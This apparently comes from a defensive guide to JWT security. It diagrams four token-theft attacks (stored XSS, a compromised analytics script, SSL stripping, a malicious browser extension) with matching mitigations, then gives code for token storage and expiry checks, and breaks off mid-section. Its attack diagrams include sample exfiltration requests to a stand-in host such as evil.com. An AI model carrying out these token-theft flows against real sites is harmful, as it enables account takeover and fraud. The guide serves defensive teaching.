An attacker discovers a stored XSS vulnerability in a social media web application that stores JWT tokens in the browser's Local Storage. The application allows users to post comments but fails to properly sanitize HTML input.

**Step-by-step attack process:**

1. **Vulnerability Discovery**: The attacker identifies that user comments are rendered without proper HTML encoding, allowing script injection

2. **Malicious Payload Crafting**: The attacker creates a comment containing JavaScript that reads from Local Storage and exfiltrates the JWT token

3. **Payload Injection**: The attacker posts the malicious comment to a popular discussion thread

4. **Victim Interaction**: Legitimate users view the thread, causing the malicious script to execute in their browsers

5. **Token Extraction**: The malicious script accesses `localStorage.getItem('jwt_token')` to retrieve the victim's authentication token

6. **Token Exfiltration**: The script sends the stolen token to an attacker-controlled server via an HTTP request or by encoding it in an image URL

7. **Token Replay**: The attacker uses the stolen token in the Authorization header of API requests to impersonate the victim

8. **Unauthorized Access**: The attacker gains full access to the victim's account, including private messages, personal data, and ability to perform actions as the victim

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant VS as Vulnerable Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>VS: POST malicious comment with XSS payload
    Note over A,VS: Payload contains script tag that<br/>fetches localStorage JWT to evil.com
    VS->>VS: Store comment without sanitization
    
    V->>VS: GET page with comments
    VS->>V: Return page with malicious script
    Note over V: JWT stored in localStorage
    
    V->>V: Browser executes injected script
    V->>V: Script reads JWT from localStorage
    V->>AS: Send token to attacker server
    Note over V,AS: GET evil.com?token=eyJhbG...
    
    AS->>A: Attacker receives stolen token
    
    A->>API: Request with stolen token
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>API: Validate token signature
    API->>A: Return victim's private data
    
    A->>API: Perform actions as victim
    Note over A,API: POST /api/transfer-money
    API->>A: Action successful
```

#### Mitigation Application

Implementing multiple layers of defense prevents this attack from succeeding:

**Step-by-step mitigation:**

1. **HttpOnly Cookie Storage**: Store JWT in HttpOnly cookie instead of Local Storage, making it inaccessible to JavaScript even if XSS exists

2. **Input Sanitization**: Implement server-side HTML sanitization to remove or escape all script tags and event handlers from user-generated content

3. **Content Security Policy**: Deploy strict CSP that blocks inline script execution and restricts script sources to trusted domains only

4. **Output Encoding**: Encode all user-generated content when rendering to browser, converting special characters to HTML entities

5. **Token Validation**: Implement additional validation beyond signature verification, checking token binding to IP address or user agent

6. **Monitoring and Detection**: Deploy security monitoring that detects unusual patterns such as tokens being used from multiple locations simultaneously

7. **Automatic Response**: When anomalous usage detected, automatically invalidate refresh tokens and require re-authentication

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant SS as Secured Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>SS: POST malicious comment with XSS payload
    Note over A,SS: Payload contains script tag<br/>attempting to steal document.cookie
    SS->>SS: Sanitize input - remove script tags
    SS->>SS: Store sanitized comment
    
    V->>SS: GET page with comments
    SS->>SS: Apply CSP header
    SS->>V: Return page with sanitized content + CSP
    Note over SS,V: CSP: default-src self / script-src self
    Note over V: JWT stored in HttpOnly cookie
    
    Note over V: ✓ No malicious script executes (CSP blocks it)
    Note over V: ✓ Even if script ran, cannot access HttpOnly cookie
    
    Note over A,AS: Attack blocked at multiple layers
    
    alt If attacker somehow obtained token
        A->>API: Request with stolen token
        Note over A,API: Authorization: Bearer eyJhbG...
        API->>API: Validate token signature
        API->>API: Validate token binding (IP, User-Agent)
        API--xA: Token binding mismatch - Request denied
        Note over API: ✗ Token rejected due to context mismatch
        
        API->>API: Log security event
        API->>API: Trigger alert for stolen token
        API->>API: Invalidate associated refresh token
    end
    
    Note over SS,API: Defense in depth:<br/>1. Input sanitization prevents injection<br/>2. CSP blocks script execution<br/>3. HttpOnly prevents token access<br/>4. Token binding prevents misuse<br/>5. Monitoring enables response
```

---

### Scenario 2: Token Theft via Compromised Third-Party Script

#### Attack Flow

An e-commerce application uses multiple third-party services including analytics, chat widgets, and advertising networks. An attacker compromises one of these third-party scripts through a supply chain attack, injecting code that steals JWT tokens.

**Step-by-step attack process:**

1. **Supply Chain Compromise**: The attacker gains access to a popular analytics provider's CDN or npm package repository

2. **Malicious Code Injection**: The attacker modifies the analytics script to include token-stealing functionality while maintaining normal analytics behavior to avoid detection

3. **Distribution**: The compromised script is automatically distributed to thousands of websites that include the third-party analytics library

4. **Script Loading**: Victim websites load the compromised script, which now runs with full access to the same-origin context

5. **Token Discovery**: The malicious code scans common token storage locations (localStorage, sessionStorage, cookies)

6. **Selective Exfiltration**: The script silently exfiltrates tokens along with normal analytics data, hiding malicious traffic in legitimate requests

7. **Mass Compromise**: The attacker collects tokens from thousands of users across multiple affected websites

8. **Token Monetization**: Stolen tokens are used for fraud, sold on dark web markets, or used for targeted attacks on high-value accounts

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant CDN as Third-Party CDN
    participant WS as Web Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>CDN: Compromise analytics provider
    Note over A,CDN: Supply chain attack
    A->>CDN: Inject token-stealing code into analytics.js
    
    CDN->>CDN: Modified script deployed
    
    V->>WS: Navigate to e-commerce site
    WS->>V: Return HTML page
    V->>CDN: Load analytics script
    Note over V,CDN: Script tag loads cdn.analytics.com/analytics.js
    
    CDN->>V: Return compromised script
    Note over V: JWT stored in localStorage
    
    V->>V: Execute analytics script
    Note over V: Script performs normal analytics AND steals token
    V->>V: Script reads localStorage.getItem auth_token
    
    V->>AS: Exfiltrate token disguised as analytics
    Note over V,AS: POST analytics.com/track<br/>body includes stolen token
    
    AS->>A: Attacker receives stolen token
    
    A->>API: Use stolen token to access victim account
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>A: Return victim's order history and payment info
    
    A->>API: Place fraudulent orders
    API->>A: Orders successful
```

#### Mitigation Application

Implementing controls specifically targeting third-party script risks prevents this attack:

**Step-by-step mitigation:**

1. **Subresource Integrity (SRI)**: Use SRI hashes on all external script tags, causing browsers to reject modified scripts that don't match the expected hash

2. **Strict Content Security Policy**: Configure CSP to whitelist only specific trusted script sources and block data exfiltration to unauthorized domains

3. **HttpOnly Cookie Storage**: Store tokens in HttpOnly cookies, preventing third-party scripts from accessing them even when loaded on the page

4. **Script Isolation**: Load third-party scripts in sandboxed iframes with restricted permissions when possible

5. **Network Monitoring**: Monitor outbound network requests for suspicious patterns, such as authentication data being sent to unexpected domains

6. **Dependency Auditing**: Regularly audit third-party dependencies and maintain an inventory of all external scripts

7. **Rapid Response**: Maintain capability to quickly remove or update third-party scripts when compromises are discovered

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant CDN as Third-Party CDN
    participant SS as Secured Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>CDN: Compromise analytics provider
    A->>CDN: Inject malicious code into analytics.js
    CDN->>CDN: Script modified (hash changed)
    
    V->>SS: Navigate to e-commerce site
    SS->>V: Return HTML with SRI and strict CSP
    Note over SS,V: Script tag with integrity=sha384-expected-hash<br/>CSP restricts script-src and connect-src
    Note over V: JWT stored in HttpOnly cookie
    
    V->>CDN: Request analytics script
    CDN->>V: Return compromised script
    
    V->>V: Calculate script hash
    V->>V: Compare with SRI hash
    Note over V: ✗ Hash mismatch detected!
    V--xV: Refuse to execute script
    Note over V: Script blocked by SRI validation
    
    alt If script somehow executed (backup defense)
        V->>V: Script attempts localStorage access
        Note over V: ✓ Token not in localStorage (HttpOnly cookie)
        V->>V: Script finds no token to steal
        
        V--xAS: Script attempts exfiltration
        Note over V: ✗ CSP blocks connection to unauthorized domain
    end
    
    SS->>SS: Monitor CSP violation reports
    SS->>SS: Alert on SRI failures
    SS->>SS: Remove/update compromised script
    
    Note over SS,API: Defense in depth:<br/>1. SRI prevents execution of modified scripts<br/>2. CSP restricts script capabilities<br/>3. HttpOnly prevents token access<br/>4. connect-src limits data exfiltration<br/>5. Monitoring enables rapid response
```

---

### Scenario 3: Man-in-the-Middle Attack on Insecure Connection

#### Attack Flow

A user accesses their company's web portal from a coffee shop using public Wi-Fi. The application uses HTTPS but doesn't enforce it properly, and the attacker performs a man-in-the-middle attack to intercept the JWT token.

**Step-by-step attack process:**

1. **Network Position**: The attacker sets up a rogue Wi-Fi access point with a convincing name ("CoffeeShop-Guest-WiFi") or compromises the legitimate access point

2. **Victim Connection**: The user connects to the malicious Wi-Fi network to access their company portal

3. **SSL Stripping**: The attacker uses SSL stripping tools to intercept HTTPS connections and downgrade them to HTTP where possible

4. **Initial Request Interception**: When the user navigates to the portal, the attacker's MITM proxy intercepts the request

5. **Protocol Downgrade**: The proxy presents an HTTP version of the site to the victim while maintaining HTTPS to the real server, or presents a fake certificate

6. **Authentication Capture**: When the user logs in, the attacker captures the credentials and the JWT token issued by the server

7. **Token Interception**: All subsequent requests containing the JWT token in headers or cookies are intercepted and logged

8. **Token Replay**: The attacker uses the captured token from their own device to access the victim's account on the legitimate HTTPS connection

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker (MITM Proxy)
    participant V as Victim
    participant WS as Web Server
    participant API as API Server

    Note over A: Attacker controls Wi-Fi network
    
    V->>A: Connect to malicious Wi-Fi
    A->>V: Connection established
    
    V->>A: HTTP request to portal (initial)
    Note over V,A: http://portal.company.com
    A->>WS: Forward request as HTTPS
    Note over A,WS: https://portal.company.com
    
    WS->>A: HTTPS response (redirect to HTTPS)
    A->>V: Deliver as HTTP (strip SSL)
    Note over A,V: SSL Stripping - remove HTTPS redirect
    
    V->>V: User enters credentials
    V->>A: POST login credentials (HTTP)
    Note over V: ⚠ User doesnt notice missing lock icon
    
    A->>A: Capture credentials and requests
    A->>WS: Forward login (HTTPS)
    
    WS->>A: Return JWT token in response
    Note over WS,A: Set-Cookie: jwt=eyJhbG... with Secure flag
    A->>A: Log captured JWT token
    
    A->>V: Forward response (HTTP, remove Secure flag)
    Note over A,V: Set-Cookie: jwt=eyJhbG... without Secure
    
    V->>A: Subsequent API requests with token (HTTP)
    Note over V,A: Cookie: jwt=eyJhbG...
    A->>A: Capture token in all requests
    A->>WS: Forward requests (HTTPS)
    
    WS->>A: API responses
    A->>V: Forward responses
    
    Note over A: Attacker now has valid JWT
    
    A->>API: Use stolen token from attackers device
    Note over A,API: Authorization: Bearer eyJhbG...<br/>from HTTPS connection
    API->>A: Grant access to victims account
    
    A->>API: Extract sensitive data
    API->>A: Return confidential information
```

#### Mitigation Application

Implementing proper HTTPS enforcement and additional safeguards prevents this MITM attack:

**Step-by-step mitigation:**

1. **HTTPS Everywhere**: Configure server to redirect all HTTP requests to HTTPS at the infrastructure level (load balancer/CDN)

2. **HTTP Strict Transport Security (HSTS)**: Send HSTS header instructing browsers to always use HTTPS, preventing downgrade attacks

3. **HSTS Preloading**: Submit domain to browser HSTS preload lists, ensuring HTTPS enforcement even on first visit

4. **Secure Cookie Flag**: Set Secure flag on all cookies containing tokens, preventing transmission over HTTP

5. **Certificate Validation**: Implement certificate pinning in mobile apps and educate users about certificate warnings

6. **Token Binding**: Bind tokens to TLS channel characteristics, making intercepted tokens unusable

7. **Monitoring**: Detect and alert on connections using HTTP or with certificate validation failures

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker (MITM Proxy)
    participant V as Victim
    participant SS as Secured Server
    participant API as API Server

    Note over A: Attacker controls Wi-Fi network
    
    V->>A: Connect to malicious Wi-Fi
    A->>V: Connection established
    
    V->>A: HTTP request to portal (initial)
    Note over V,A: http://portal.company.com
    
    Note over V: ✓ Browser has HSTS preload entry
    V->>V: Automatically upgrade to HTTPS
    Note over V: Internal upgrade: https://portal.company.com
    
    V->>A: HTTPS request (TLS handshake)
    A->>V: Present fake certificate
    
    V->>V: Validate certificate
    Note over V: ✗ Certificate invalid or not trusted!
    V--xA: Refuse connection
    V->>V: Display security warning
    
    Note over V: User cannot proceed without explicitly bypassing warning
    
    alt If user bypasses warning (backup defenses)
        V->>A: Establish HTTPS with fake cert
        A->>SS: Connect to real server with HTTPS
        
        V->>A: User attempts login
        A->>A: Cannot intercept encrypted content effectively
        A->>SS: Forward login
        
        SS->>A: Return JWT with security headers
        Note over SS,A: Set-Cookie with jwt token<br/>Flags: Secure / HttpOnly / SameSite=Strict<br/>HSTS header with max-age=31536000
        
        Note over A,V: ✓ Even if MITM present:<br/>- Token in HttpOnly cookie<br/>- Secure flag prevents HTTP transmission<br/>- Token bound to TLS channel
    end
    
    alt Legitimate secure connection
        V->>SS: Direct HTTPS connection (HSTS forces it)
        SS->>V: Valid certificate presented
        V->>V: Validate certificate successfully
        V->>SS: TLS handshake complete
        
        V->>SS: Login request (encrypted)
        SS->>V: JWT token with security flags
        Note over SS,V: Flags: Secure / HttpOnly / SameSite / HSTS
        
        V->>SS: Subsequent requests (encrypted)
        Note over V,SS: Token transmitted over TLS only
        SS->>V: Responses
    end
    
    Note over V,API: Defense in depth:<br/>1. HSTS preload prevents HTTP connections<br/>2. Certificate validation prevents MITM<br/>3. Secure flag prevents HTTP token transmission<br/>4. TLS encryption protects token in transit<br/>5. Token binding to TLS channel<br/>6. User education about security warnings
```

---

### Scenario 4: Token Theft via Browser Extension Malware

#### Attack Flow

An attacker distributes a malicious browser extension disguised as a productivity tool. Once installed, the extension uses its permissions to extract JWT tokens from any website the user visits.

**Step-by-step attack process:**

1. **Malicious Extension Creation**: The attacker creates a browser extension with legitimate-appearing functionality (ad blocker, password manager, productivity tool) but includes hidden malicious code

2. **Distribution**: The extension is distributed through official browser extension stores with fake reviews, social media promotion, or bundled with other software

3. **Installation**: Users install the extension, granting it broad permissions including "access to all websites" and "storage access"

4. **Activation**: Once installed, the extension runs on every web page the user visits, with full access to the DOM and browser APIs

5. **Token Discovery**: The extension's background script monitors and accesses localStorage, sessionStorage, and non-HttpOnly cookies across all sites

6. **Continuous Monitoring**: The extension watches for authentication events and captures tokens as they're stored

7. **Data Exfiltration**: Captured tokens are periodically sent to attacker-controlled servers, often encrypted or obfuscated to avoid detection

8. **Mass Exploitation**: The attacker accumulates tokens from multiple services (banking, email, social media, work accounts) for each victim

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant ES as Extension Store
    participant V as Victim Browser
    participant ME as Malicious Extension
    participant WS as Web Server
    participant AS as Attacker Server
    participant API as API Server

    A->>ES: Upload productivity tool extension
    Note over A,ES: Extension requests broad permissions
    ES->>ES: Automated review (passes)
    
    V->>ES: Search for productivity tools
    ES->>V: Show malicious extension with fake reviews
    V->>ES: Install extension
    
    ES->>V: Prompt for permissions
    Note over V: Permissions: Access to all websites<br/>Read and modify storage
    V->>V: User grants permissions
    ES->>V: Install malicious extension
    
    V->>ME: Extension activated
    ME->>ME: Register content scripts for all sites
    ME->>ME: Start background monitoring
    
    V->>WS: User logs into banking site
    WS->>V: Authentication successful
    WS->>V: Store JWT in localStorage
    Note over V: localStorage.setItem auth_token = eyJhbG...
    
    ME->>V: Content script monitors storage events
    ME->>ME: Detect new token stored
    ME->>V: Access localStorage.getItem auth_token
    ME->>ME: Capture JWT token
    
    ME->>AS: Exfiltrate token to attacker server
    Note over ME,AS: POST analytics-cdn.com/metrics<br/>body includes userId and token
    
    AS->>A: Attacker receives token
    
    Note over A: Repeat for all sites user visits
    
    A->>API: Use stolen banking token
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>A: Grant access to victims banking
    
    A->>API: Initiate fraudulent transactions
    API->>A: Transactions successful
```

#### Mitigation Application

Implementing defenses that limit extension capabilities and token accessibility prevents this attack:

**Step-by-step mitigation:**

1. **HttpOnly Cookie Storage**: Store all JWT tokens in HttpOnly cookies that browser extensions cannot access through JavaScript APIs

2. **Extension Security Policies**: Modern browsers can restrict extension access to sensitive cookies through manifest v3 and security policies

3. **Token Encryption**: For tokens that must be in accessible storage, encrypt them with keys not accessible to extensions

4. **Minimal Token Lifetime**: Very short-lived tokens limit the window of vulnerability even if extensions capture them

5. **Behavioral Detection**: Monitor for tokens being used from unusual contexts or simultaneously from multiple locations

6. **User Education**: Train users to review extension permissions carefully and install only trusted extensions

7. **Allowlisting**: In enterprise environments, use policies to allow only pre-approved extensions

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant ES as Extension Store
    participant V as Victim Browser
    participant ME as Malicious Extension
    participant SS as Secured Server
    participant API as API Server
    participant MON as Monitoring System

    A->>ES: Upload productivity tool extension
    ES->>ES: Review process
    
    V->>ES: Install extension
    ES->>V: Prompt for permissions
    Note over V: Permissions: Access to all websites<br/>Read and modify storage
    V->>V: User grants permissions
    ES->>V: Install malicious extension
    
    V->>ME: Extension activated
    ME->>ME: Register content scripts
    
    V->>SS: User logs into banking site
    SS->>V: Authentication successful
    
    SS->>V: Store JWT in HttpOnly cookie
    Note over SS,V: Set-Cookie: auth_token=eyJhbG...<br/>Flags: HttpOnly / Secure / SameSite=Strict
    Note over V: ✓ Token stored in HTTP-only cookie
    
    ME->>V: Content script monitors storage
    ME->>V: Attempt to access localStorage
    Note over ME,V: ✓ No token in localStorage
    
    ME->>V: Attempt to access document.cookie
    V->>ME: Return empty (HttpOnly cookies not accessible)
    Note over ME,V: ✓ HttpOnly cookie not readable by JavaScript
    
    ME->>V: Attempt to intercept network requests
    V->>SS: API request with cookie (automatic)
    Note over V,SS: Cookie automatically attached by browser
    Note over ME,V: ✓ Extension can see requests but not extract HttpOnly cookie value
    
    ME--xME: No token captured
    
    Note over V: Token used for 15 minutes only (short-lived)
    
    V->>SS: Multiple API requests with token
    SS->>API: Process authenticated requests
    API->>MON: Log authentication events
    
    MON->>MON: Analyze access patterns
    Note over MON: ✓ Monitor for:<br/>- Unusual access times<br/>- New device fingerprints<br/>- Geographic anomalies<br/>- Concurrent sessions
    
    alt If token somehow stolen (backup detection)
        A->>API: Attempt to use token from different context
        API->>API: Validate token
        API->>API: Check token binding (User-Agent and IP)
        API->>MON: Log authentication attempt
        
        MON->>MON: Detect anomaly
        Note over MON: ✗ Token used from suspicious context
        MON->>API: Trigger security alert
        API->>API: Invalidate refresh token
        API->>V: Require re-authentication
    end
    
    Note over V,API: Defense in depth:<br/>1. HttpOnly prevents extension access<br/>2. Short token lifetime limits exposure<br/>3. Token binding restricts usage<br/>4. Behavioral monitoring detects anomalies<br/>5. Rapid token rotation limits impact<br/>6. User education reduces risk
    
    Note over V: Enterprise policies (additional layer)
    Note over V: ✓ Only approved extensions allowed<br/>✓ Extension permissions regularly audited<br/>✓ Security training for users
```

---

## Token Storage and Expiration Management

This section provides comprehensive details on how JWT tokens are stored, how expiration is checked, and what happens when tokens expire.

### Token Storage Locations

After the server generates the JWT Access Token, it's sent to the browser and stored on the client. The storage location significantly impacts security and vulnerability to theft.

#### Storage Options (Most to Least Secure)

**1. HttpOnly Cookies (Most Secure - Recommended)**

```
Server Response:
Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/

Browser: Automatically stores in cookie jar
Location: Browser's cookie storage (not accessible to JavaScript)
```

**Pros:**
- Not accessible to JavaScript (XSS protection)
- Automatically sent with requests
- Protected from browser extensions
- Secure flag prevents HTTP transmission

**Cons:**
- Requires CSRF protection
- Slightly more complex CORS setup
- May complicate cross-domain authentication flows

**2. In-Memory (JavaScript Variables)**

```javascript
// Stored in JavaScript variable
let accessToken = "eyJhbG...";

// Lost when:
// - Page refreshes
// - Tab closes
// - Browser closes
```

**Pros:**
- Not persisted to disk
- Cleared automatically on refresh/close
- No persistent storage attack surface

**Cons:**
- Lost on page refresh (poor UX)
- Still vulnerable to XSS during active session
- Doesn't work for multi-tab applications
- Requires re-authentication on every page load

**3. Session Storage**

```javascript
// Stored in browser's session storage
sessionStorage.setItem('access_token', 'eyJhbG...');

// Persists: Only for the browser tab session
// Cleared: When tab/window closes
```

**Pros:**
- Cleared when tab closes
- Scoped to single tab (isolation)
- Better UX than in-memory (survives page refresh)

**Cons:**
- Accessible to JavaScript (XSS risk)
- Accessible to browser extensions
- Not shared across tabs
- Still vulnerable to XSS attacks

**4. Local Storage (Least Secure - Not Recommended)**

```javascript
// Stored in browser's local storage
localStorage.setItem('access_token', 'eyJhbG...');

// Persists: Until explicitly cleared
// Survives: Browser restarts, tab closes
```

**Pros:**
- Persists across sessions
- Simple to use
- Shared across tabs
- Good UX (no re-authentication)

**Cons:**
- Accessible to JavaScript (XSS risk)
- Accessible to browser extensions
- Persists indefinitely
- Highest risk for token theft

#### Storage Comparison Table

| Storage Method | XSS Risk | Extension Risk | MITM Risk | CSRF Risk | Persistence | UX Impact |
|---------------|----------|----------------|-----------|-----------|-------------|-----------|
| **HttpOnly Cookie** | ✅ Protected | ✅ Protected | ⚠️ If not HTTPS | ⚠️ Needs CSRF token | Session-based | Excellent |
| **In-Memory** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | None | Poor |
| **Session Storage** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | Tab session | Good |
| **Local Storage** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | Indefinite | Excellent |

#### How Token Storage Works in Practice

**Server sends token:**

```http
HTTP/1.1 200 OK
Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json

{
  "access_token": "eyJhbG...",  // If not using cookie
  "refresh_token": "...",        // Always in HttpOnly cookie
  "expires_in": 900              // 15 minutes
}
```

**Browser stores it:**
- If in cookie: Browser's cookie jar (automatic)
- If in response body: JavaScript code stores it in chosen location

**Browser uses it:**

```javascript
// If stored in cookie (HttpOnly):
// Browser automatically includes in requests:
// Cookie: access_token=eyJhbG...

// If stored in localStorage/sessionStorage:
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
  }
})
```

### Expiration Checking Process

Understanding how the system checks token expiration is crucial for security and understanding token lifecycle.

#### Access Token Expiration Check

Access tokens are JWTs with an `exp` (expiration) claim. The server checks expiration during validation:

**Step-by-Step Process:**

1. **Extract and Decode the Token**
   ```javascript
   // Server receives request
   const token = req.headers.authorization.split(' ')[1]; // "Bearer eyJhbG..."
   
   // Split the token into parts
   const [headerB64, payloadB64, signature] = token.split('.');
   
   // Base64URL decode the payload
   const payload = JSON.parse(base64UrlDecode(payloadB64));
   ```

2. **Read the Expiration Claim**
   ```javascript
   // Payload contains:
   {
     "sub": "1234567890",
     "name": "John",
     "iat": 1699990000,  // Issued at (Unix timestamp)
     "exp": 1700000000,  // Expiration (Unix timestamp)
     "iss": "auth.example.com"
   }
   ```

3. **Compare with Current Time**
   ```javascript
   const currentTime = Math.floor(Date.now() / 1000); // Current Unix timestamp
   const expirationTime = payload.exp;
   
   if (currentTime >= expirationTime) {
     // Token is expired
     return res.status(401).json({ error: 'Token expired' });
   }
   
   // Token is still valid
   // Continue with request processing
   ```

**Complete Validation Flow:**

```javascript
function validateAccessToken(token) {
  try {
    // 1. Split token into parts
    const parts = token.split('.');
    if (parts.length !== 3) {
      throw new Error('Invalid token format');
    }

    // 2. Decode payload (without verification for expiration check)
    const payload = JSON.parse(base64UrlDecode(parts[1]));

    // 3. Check expiration claim
    const currentTime = Math.floor(Date.now() / 1000);
    const expirationTime = payload.exp;

    if (!expirationTime) {
      throw new Error('Token missing expiration claim');
    }

    if (currentTime >= expirationTime) {
      return {
        valid: false,
        error: 'Token expired',
        expiredAt: new Date(expirationTime * 1000)
      };
    }

    // 4. Check issued at (optional - ensure token not used before issued)
    if (payload.iat && currentTime < payload.iat) {
      return {
        valid: false,
        error: 'Token not yet valid'
      };
    }

    // 5. Verify signature (cryptographic verification)
    const isValidSignature = verifySignature(token, secretKey);
    if (!isValidSignature) {
      return {
        valid: false,
        error: 'Invalid token signature'
      };
    }

    // 6. Token is valid
    return {
      valid: true,
      payload: payload,
      expiresIn: expirationTime - currentTime // seconds until expiration
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

#### Refresh Token Expiration Check

Refresh token expiration depends on the implementation:

**Option 1: JWT-Based Refresh Token (Stateless)**

If the refresh token is also a JWT, expiration is checked the same way:

```javascript
function validateRefreshToken(refreshToken) {
  try {
    // Decode payload
    const payload = JSON.parse(base64UrlDecode(refreshToken.split('.')[1]));
    
    // Check expiration
    const currentTime = Math.floor(Date.now() / 1000);
    const expirationTime = payload.exp;

    if (currentTime >= expirationTime) {
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // Verify signature
    const isValidSignature = verifySignature(refreshToken, refreshTokenSecret);
    
    return {
      valid: isValidSignature,
      payload: payload
    };
  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

**Option 2: Database-Stored Refresh Token (Stateful)**

If refresh tokens are stored in a database, expiration is checked via database lookup:

```javascript
async function validateRefreshToken(refreshToken) {
  try {
    // 1. Look up token in database
    const tokenRecord = await db.refreshTokens.findOne({
      where: { token: hashToken(refreshToken) } // Store hashed version
    });

    if (!tokenRecord) {
      return {
        valid: false,
        error: 'Refresh token not found'
      };
    }

    // 2. Check if token is revoked
    if (tokenRecord.revoked === true) {
      return {
        valid: false,
        error: 'Refresh token revoked'
      };
    }

    // 3. Check expiration (stored in database)
    const currentTime = new Date();
    const expirationTime = tokenRecord.expiresAt;

    if (currentTime >= expirationTime) {
      // Optionally delete expired token
      await db.refreshTokens.destroy({
        where: { id: tokenRecord.id }
      });
      
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // 4. Check if token is still valid
    return {
      valid: true,
      userId: tokenRecord.userId,
      expiresAt: tokenRecord.expiresAt
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

**Option 3: Hybrid Approach (JWT + Database)**

Many systems use JWTs with database validation for revocation:

```javascript
async function validateRefreshToken(refreshToken) {
  try {
    // 1. Decode JWT to get claims
    const payload = JSON.parse(base64UrlDecode(refreshToken.split('.')[1]));
    
    // 2. Check JWT expiration
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime >= payload.exp) {
      return {
        valid: false,
        error: 'Refresh token expired'
      };
    }

    // 3. Check database for revocation (even if JWT not expired)
    const tokenRecord = await db.refreshTokens.findOne({
      where: { 
        jti: payload.jti, // JWT ID claim
        userId: payload.sub 
      }
    });

    if (!tokenRecord || tokenRecord.revoked) {
      return {
        valid: false,
        error: 'Refresh token revoked'
      };
    }

    // 4. Verify signature
    const isValidSignature = verifySignature(refreshToken, refreshTokenSecret);
    
    return {
      valid: isValidSignature,
      payload: payload,
      tokenRecord: tokenRecord
    };

  } catch (error) {
    return {
      valid: false,
      error: error.message
    };
  }
}
```

#### Key Differences

| Aspect | Access Token | Refresh Token |
|--------|-------------|---------------|
| **Expiration Check** | Always from JWT `exp` claim | JWT `exp` claim OR database `expiresAt` |
| **Validation Location** | Every API request | Only during refresh request |
| **Revocation Check** | Usually not checked (stateless) | Often checked in database |
| **Performance** | Fast (no DB lookup) | May require DB lookup |
| **Typical Lifetime** | 5-60 minutes | Hours to days |

#### Important Notes

1. **Clock Skew**: Servers may allow a small time window (e.g., 60 seconds) to account for clock differences:
   ```javascript
   const clockSkew = 60; // seconds
   if (currentTime >= (expirationTime + clockSkew)) {
     // Expired
   }
   ```

2. **Not Before (nbf) Claim**: Some tokens include an `nbf` (not before) claim:
   ```javascript
   if (payload.nbf && currentTime < payload.nbf) {
     return { valid: false, error: 'Token not yet valid' };
   }
   ```

3. **Token Refresh Timing**: Clients often refresh before expiration:
   ```javascript
   // Refresh when 80% of lifetime has passed
   const timeUntilExpiry = expirationTime - currentTime;
   const tokenLifetime = expirationTime - payload.iat;
   if (timeUntilExpiry < (tokenLifetime * 0.2)) {
     // Refresh token proactively
   }
   ```

### What Happens When Access Token Expires

#### Scenario: Access Token Expires (Refresh Token Still Valid)

**Step-by-Step Flow:**

1. **User Makes Request**
   ```
   User clicks button → Browser sends API request
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (expired access token)
   ```

2. **Server Validates Token**
   ```javascript
   // Server checks expiration
   const currentTime = Math.floor(Date.now() / 1000);
   const expirationTime = payload.exp; // e.g., 1700000000
   
   if (currentTime >= expirationTime) {
     // Token is expired!
     return res.status(401).json({ 
       error: "Token expired",
       code: "TOKEN_EXPIRED"
     });
   }
   ```

3. **Client Receives 401 Response**
   ```javascript
   // Client detects 401 Unauthorized
   if (response.status === 401 && response.error === "TOKEN_EXPIRED") {
     // Access token expired - need to refresh
   }
   ```

4. **Automatic Token Refresh (Seamless)**
   ```javascript
   // Client automatically attempts refresh
   POST /refresh
   Cookie: refresh_token=eyJhbG... (still valid)
   
   // Server validates refresh token
   // - Checks expiration: still valid ✓
   // - Checks revocation: not revoked ✓
   // - Verifies signature: valid ✓
   ```

5. **New Access Token Issued**
   ```javascript
   // Server generates new access token
   const newAccessToken = generateAccessToken(user);
   
   // Returns new token
   {
     "access_token": "eyJhbG...", // New token
     "expires_in": 900            // 15 minutes
   }
   ```

6. **Retry Original Request**
   ```javascript
   // Client retries original request with new token
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (new access token)
   
   // Server validates: ✓ Valid
   // Server returns: Protected data
   ```

**User Experience:**
- ✅ Usually seamless - the refresh happens automatically
- ✅ No interruption - the user doesn't see a login screen
- ⚠️ Slight delay - one extra round-trip for refresh

**Visual Flow:**
```
User Action
    │
    ▼
API Request (expired access token)
    │
    ▼
401 Unauthorized
    │
    ▼
Automatic Refresh Request
    │
    ▼
New Access Token Issued
    │
    ▼
Retry Original Request (new token)
    │
    ▼
Success - Data Returned
```

### What Happens When Refresh Token Expires

#### Scenario: Refresh Token Expires

**Step-by-Step Flow:**

1. **Access Token Expires (as before)**
   ```
   GET /api/protected-resource
   Authorization: Bearer eyJhbG... (expired access token)
   
   Response: 401 Unauthorized - Token expired
   ```

